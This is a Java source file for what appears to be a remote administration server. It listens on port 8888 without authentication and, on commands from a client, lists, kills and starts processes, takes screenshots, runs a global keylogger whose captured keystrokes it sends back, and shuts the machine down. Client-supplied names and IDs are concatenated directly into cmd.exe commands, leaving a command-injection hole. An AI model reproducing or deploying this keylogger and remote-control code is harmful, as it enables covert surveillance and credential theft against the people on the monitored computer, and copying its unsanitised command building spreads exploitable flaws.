package server;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;

class ServerHandler extends Thread implements NativeKeyListener {

    private ServerSocket serverC = null;
    private Socket client = null;
    private int port = 8888;
    DataInputStream dIn;
    DataOutputStream dOut;
    public int apps = 0;
    public int lines = 0;
    public static String result = "";
    
    public ServerHandler() throws IOException {
        start();
    }
    /**
     * 
     * Thread used to receive and 
     * authenticate the random password
     * generated at server.
     * 
     */
    @Override
    public void run() {
        try {
            int clients = 0;
            serverC = new ServerSocket(port);
            client = serverC.accept();
            dIn = new DataInputStream(client.getInputStream()); 
            dOut = new DataOutputStream(client.getOutputStream());
            
            while (clients == 0) {
                if(client!=null) {   
                    String re = dIn.readUTF();

                    boolean checkApp = true;
                    //APPLICATION
                    if (re.equals("APP")){
                        while (checkApp){
                            
                            String aRe = dIn.readUTF();
                            
                            if (aRe.equals("LISTAPP")) {
                                apps = 0;    
                                Process process = new ProcessBuilder("powershell","\"gps| ? {$_.mainwindowtitle.length -ne 0} | Select Name, ID, @{Name='ThreadCount';Expression ={$_.Threads.Count}}").start();
                                new Thread(() -> {
                                    Scanner sc = new Scanner(process.getInputStream());
                                    if (sc.hasNextLine()) {
                                        sc.nextLine();
                                    }
                                    while (sc.hasNextLine())
                                    {
                                        String line = sc.nextLine();
                                        if (!line.equals("")) {
                                            apps++;
                                        }
                                    }
                                }).start();
                                process.waitFor(10,TimeUnit.SECONDS);
                        
                                dOut.writeByte(apps);
                                System.out.println(apps);
                                Process p = new ProcessBuilder("powershell.exe","\"gps| ? {$_.mainwindowtitle.length -ne 0} | Select Name, ID, @{Name='ThreadCount';Expression ={$_.Threads.Count}}").start();
                                new Thread(() ->
                                {
                                   Scanner sc = new Scanner(p.getInputStream());
                                   if (sc.hasNextLine()) {
                                       sc.nextLine();
                                   }
                                   while (sc.hasNextLine()) 
                                   {
                                       String line = sc.nextLine();
                                       if (!line.equals("")) {
                                           try {
                                               dOut.writeUTF(line);
                                               System.out.println(line);
                                           } catch (IOException ex) {
                                               Logger.getLogger(ServerHandler.class.getName()).log(Level.SEVERE, null, ex);
                                           }
                                       }
                                   }
                                }).start();
                                p.waitFor(10,TimeUnit.SECONDS);

                                System.out.println("Done");
                                dOut.flush();
                            }
                                
                            if (aRe.equals("KILLAPP")) {
                                
                                boolean checkID = true;
                                
                                while (checkID) {
                                    String ID = dIn.readUTF();
                                    if (ID.equals("EXITKILL")){
                                        checkID = false;
                                        break;
                                    }
                                    
                                    String cmd = "taskkill /PID "+ID+" /F";
                                    System.out.println(cmd);
                                    Process process = new ProcessBuilder("cmd.exe","/c",cmd).start();
                                    BufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));
                                    String line = r.readLine();
                                    if (line == null) {
                                        dOut.writeByte(0);
                                        dOut.flush();
                                    } else {
                                        dOut.writeByte(1);
                                        dOut.flush();
                                    }
                                    process.waitFor(10,TimeUnit.SECONDS);
                                }
                            }

                            if (aRe.equals("STARTAPP")) {
                                boolean checkname = true;
                                
                                while (checkname) {
                                    String name = dIn.readUTF();
                                    if (name.equals("EXITSTART")){
                                        checkname = false;
                                        break;
                                    }
                                    
                                    String cmd = "start " + name + ".exe";                                
                                    ProcessBuilder p = new ProcessBuilder("cmd.exe","/c",cmd);
                                    Process process = p.start();
                                    process.waitFor(10,TimeUnit.SECONDS); 
                                    
                                    InputStream error = process.getErrorStream();
                                    if (error.available() > 0) {
                                        dOut.writeByte(0);
                                        dOut.flush();
                                    } else {
                                        dOut.writeByte(1);
                                        dOut.flush();
                                    }
                                }
                            }
                            
                            if (aRe.equals("EXITAPP")) {
                                checkApp = false;
                            }
                        }
                                
                    }      
                    
                    //PROCESS
                    if (re.equals("PROCESS")) {
                        boolean checkPro = true;
                        while (checkPro) {
                            String aRe = dIn.readUTF();
                            
                            if (aRe.equals("LISTPRO")) {
                                lines = 0;    
                                Process process = new ProcessBuilder("cmd.exe","/c","tasklist").start();
                                new Thread(() -> {
                                    Scanner sc = new Scanner(process.getInputStream());
                                    if (sc.hasNextLine()) {
                                        sc.nextLine();
                                    }
                                    while (sc.hasNextLine()) {
                                        String line = sc.nextLine();
                                        lines++;
                                    }
                                }).start();
                                process.waitFor(30,TimeUnit.SECONDS);
                                System.out.println(lines);
                                dOut.writeInt(lines);

                                Process p = new ProcessBuilder("cmd.exe","/c","tasklist").start();
                                new Thread(() ->
                                {
                                   Scanner sc = new Scanner(p.getInputStream());
                                   if (sc.hasNextLine()) {
                                       sc.nextLine();
                                   }
                                   while (sc.hasNextLine()) 
                                   {
                                        String line = sc.nextLine();
                                        try {
                                            dOut.writeUTF(line);
                                        } catch (IOException ex) {
                                            Logger.getLogger(ServerHandler.class.getName()).log(Level.SEVERE, null, ex);
                                        }
                                   }
                                }).start();
                                p.waitFor(10,TimeUnit.SECONDS);

                                dOut.flush();
                            }
                            
                            if(aRe.equals("KILLPRO")){
                                boolean checkID = true;
                                
                                while (checkID) {
                                    String ID = dIn.readUTF();
                                    if (ID.equals("EXITKILL")){
                                        checkID = false;
                                        break;
                                    }
                                    
                                    String cmd = "taskkill /F /PID "+ID;
                                    System.out.println(cmd);
                                    Process process = new ProcessBuilder("cmd.exe","/c",cmd).start();
                                    BufferedReader r = new BufferedReader(new InputStreamReader(process.getInputStream()));
                                    String line = r.readLine();
                                    if (line == null) {
                                        dOut.writeByte(0);
                                        dOut.flush();
                                    } else {
                                        dOut.writeByte(1);
                                        dOut.flush();
                                    }
                                    process.waitFor(10,TimeUnit.SECONDS);
                                }
                            }
                            
                            if (aRe.equals("STARTAPP")) {
                                boolean checkname = true;
                                
                                while (checkname) {
                                    String name = dIn.readUTF();
                                    if (name.equals("EXITSTART")){
                                        checkname = false;
                                        break;
                                    }
                                    
                                    String cmd = "start " + name + ".exe";
                                    
                                    ProcessBuilder p = new ProcessBuilder("cmd.exe","/c",cmd);
                                    Process process = p.start();
                                    process.waitFor(10,TimeUnit.SECONDS); 
                                    
                                    InputStream error = process.getErrorStream();
                                    
                                    if (error.available() > 0) {
                                        dOut.writeByte(0);
                                        dOut.flush();
                                    } else {
                                        dOut.writeByte(1);
                                        dOut.flush();
                                    }
                                }
                            }
                            
                            if (aRe.equals("EXITPRO")) {
                                checkPro = false;
                            }
                            
                        }
                    }

                    //SCREENSHOT
                    if (re.equals("SCREEN")) {
                        boolean checkScreen = true;
                        while (checkScreen) {
                            String aRe = dIn.readUTF();
                            
                            BufferedOutputStream sOut = new BufferedOutputStream(client.getOutputStream());
                            
                            if (aRe.equals("SCREENSHOT")) {
                                try {
                                    BufferedImage screenShot = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                                    ImageIO.write(screenShot, "jpg", byteArrayOutputStream);
                                    byteArrayOutputStream.flush();
                                    System.out.println("Size of baos = " + byteArrayOutputStream.size());
                                    
                                    byte[] size = ByteBuffer.allocate(Integer.BYTES).putInt(byteArrayOutputStream.size()).array();
                                    sOut.write(size);
                                    byte[] buffer = byteArrayOutputStream.toByteArray();
                                    byteArrayOutputStream.close();
                                    byteArrayOutputStream = null;
                                    sOut.write(buffer);
                                    
                                    sOut.flush();                         
                                } catch (AWTException ex) {
                                    Logger.getLogger(ServerHandler.class.getName()).log(Level.SEVERE, null, ex);
                                }
                                
                            }
                            
                            if (aRe.equals("EXITSCREEN")) {
                                checkScreen = false;
                            }
                        }
                        
                    }
                    
                    //KEYLOGGER
                    if (re.equals("KEYLOGGER")) {
                        boolean checkKey = true;
                        while (checkKey) {
                            String aRe = dIn.readUTF();
                            
                            if (aRe.equals("HOOK")) {
                                java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
                                logger.setLevel(java.util.logging.Level.WARNING);
                                logger.setUseParentHandlers(false);
                                GlobalScreen.registerNativeHook();
                                GlobalScreen.addNativeKeyListener(new ServerHandler());
                            }
                            
                            if (aRe.equals("UNHOOK")) {
                                GlobalScreen.unregisterNativeHook();
                            }
                            
                            if (aRe.equals("PRINT")) {
                                System.out.println("Result : " + result);
                                dOut.writeUTF(result);
                                dOut.flush();
                            }
                            
                            if (aRe.equals("EXITKEY")) {
                                checkKey = false;
                            }
                            
                        }
                    }
                    
                    //SHUTDOWN
                    if (re.equals("SHUTDOWN")) {
                        Runtime runtime = Runtime.getRuntime();
                        try {
                            System.out.println("Shutting down your PC after 5 secs.");
                            runtime.exec("shutdown -s -t 5");
                            serverC.close();
                            System.exit(0);
                        }
                        catch(IOException e) {
                            System.out.println("Exception: " + e);
                        }
                    }
                    
                    if (re.equals("EXIT")){
                        clients++;
                    }
                }
            }
            
            serverC.close();
            System.exit(0);
          
        } catch (IOException | InterruptedException ex) {
            
        } catch (NativeHookException ex) {
            Logger.getLogger(ServerHandler.class.getName()).log(Level.SEVERE, null, ex);
        }
            
    }
    
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) { 
        String key = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        if (key.length() > 1) key = "[" + key + "]";
        result = result + key;
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) { 
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) { // When a key is released
    }
  
}